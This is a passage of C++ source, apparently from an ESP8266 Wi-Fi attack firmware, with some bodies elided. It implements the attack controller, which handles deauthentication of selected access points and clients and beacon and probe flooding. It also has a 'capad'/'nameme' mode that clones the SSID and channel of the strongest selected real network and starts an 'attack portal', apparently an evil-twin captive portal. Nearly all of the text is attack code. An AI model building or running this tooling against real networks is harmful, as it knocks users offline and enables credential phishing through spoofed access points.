...
void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool output, uint32_t timeout) {
    start(beacon, deauth, deauthAll, probe, false, false, output, timeout);
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool capad, bool output, uint32_t timeout) {
    start(beacon, deauth, deauthAll, probe, capad, false, output, timeout);
}

void Attack::start(bool beacon, bool deauth, bool deauthAll, bool probe, bool capad, bool nameme, bool output, uint32_t timeout) {
    bool requestedPortal = (capad || nameme) && (accesspoints.selected() > 0);
    bool requestedNameme = nameme && requestedPortal;
    bool requestedBeacon = beacon || requestedPortal;
    bool requestedDeauth = deauth || deauthAll;
    bool requestedProbe  = probe;

    if (capad && !requestedPortal) {
        prntln(A_CAPAD_NO_AP_ERROR);
    }

    if (nameme && !requestedPortal) {
        prntln(A_NAMEME_NO_AP_ERROR);
    }

    if (requestedBeacon || requestedProbe || deauthAll || deauth || requestedPortal) {
        start();

        Attack::beacon.active = requestedBeacon;
        Attack::deauth.active = requestedDeauth;
        Attack::deauthAll     = deauthAll;
        Attack::probe.active  = requestedProbe;
        Attack::capadActive   = requestedPortal;
        Attack::output        = output;
        Attack::timeout       = timeout;

        if (requestedPortal) {
            int primaryAP = getPrimaryCapadAP();

            if (primaryAP >= 0) {
                wifi::enableAttackPortal(accesspoints.getSSID(primaryAP), accesspoints.getCh(primaryAP), requestedNameme);
            } else {
                Attack::capadActive = false;
                prntln(requestedNameme ? A_NAMEME_NO_AP_ERROR : A_CAPAD_NO_AP_ERROR);
            }
        } else if (settings::getWebSettings().enabled) {
            wifi::stopAP();
        }
    } else {
...
void Attack::stop() {
    bool portalWasActive = capadActive;

    if (portalWasActive) wifi::disableAttackPortal();
    capadActive = false;
    ...
    if (running) {
        ...
        if (!portalWasActive && settings::getWebSettings().enabled && !scan.isScanning()) {
            wifi::resumeAP();
        }
    }
}
...
void Attack::updateCounter() {
    uint16_t cloneTargetCount = getCloneTargetCount();
    ...
    if (beacon.active) {
        beacon.maxPkts = capadActive ? cloneTargetCount : ssids.count();
    ...
    if (probe.active) probe.maxPkts = (capadActive ? cloneTargetCount : ssids.count()) * settings::getAttackSettings().probe_frames_per_ssid;
...
String Attack::getStatusJSON() {
    uint16_t targetCount = capadActive ? getCloneTargetCount() : ssids.count();
    ...
    json += String(OPEN_BRACKET) + b2s(beacon.active) + String(COMMA) + String(targetCount) + String(COMMA) + String(
        beaconPkts) + String(COMMA) + String(beacon.maxPkts) + String(CLOSE_BRACKET) + String(COMMA);            // [false,0,0,0],
    json += String(OPEN_BRACKET) + b2s(probe.active) + String(COMMA) + String(targetCount) + String(COMMA) + String(
...
void Attack::probeUpdate() {
    if (probe.active && (probe.maxPkts > 0) && (probe.packetCounter < probe.maxPkts)) {
        if (probe.time <= currentTime - (1000 / probe.maxPkts)) {
            ...
            if (probe.tc >= (capadActive ? getCloneTargetCount() : ssids.count())) probe.tc = 0;
        }
    }
}
...
void Attack::beaconUpdate() {
    if (beacon.active && (beacon.maxPkts > 0) && (beacon.packetCounter < beacon.maxPkts)) {
        if (beacon.time <= currentTime - (1000 / beacon.maxPkts)) {
            ...
            if (beacon.tc >= (capadActive ? getCloneTargetCount() : ssids.count())) beacon.tc = 0;
        }
    }
}

uint16_t Attack::getCloneTargetCount() {
    return capadActive ? accesspoints.selected() : 0;
}

int Attack::getSelectedAPIndex(uint16_t selectedTarget) {
    uint16_t targetCounter = 0;
    int      accesspointCount = accesspoints.count();

    for (int i = 0; i < accesspointCount; i++) {
        if (!accesspoints.getSelected(i)) continue;

        if (targetCounter == selectedTarget) return i;
        ++targetCounter;
    }
...
int Attack::getPrimaryCapadAP() {
    ...
    for (int i = 0; i < count; i++) {
        ...
        int rssi = accesspoints.getRSSI(i);

        if ((bestID < 0) || (rssi > bestRSSI)) {
            bestID   = i;
            bestRSSI = rssi;
        }
    }
...
bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_t ch) {
    if (!apMac || !stMac) return false;  // exit when station or AP mac is null
...
bool Attack::sendBeacon(uint8_t tc) {
    if (capadActive) {
        int apID = getSelectedAPIndex(tc);

        if (apID < 0) return false;

        mac[5] = tc;
        return sendBeacon(mac,
                          accesspoints.getSSID(apID).c_str(),
                          accesspoints.getCh(apID),
                          false);
    }
...
bool Attack::sendProbe(uint8_t tc) {
    if (capadActive) {
        ...
        mac[5] = tc;
        return sendProbe(mac, accesspoints.getSSID(apID).c_str(), accesspoints.getCh(apID));
    }
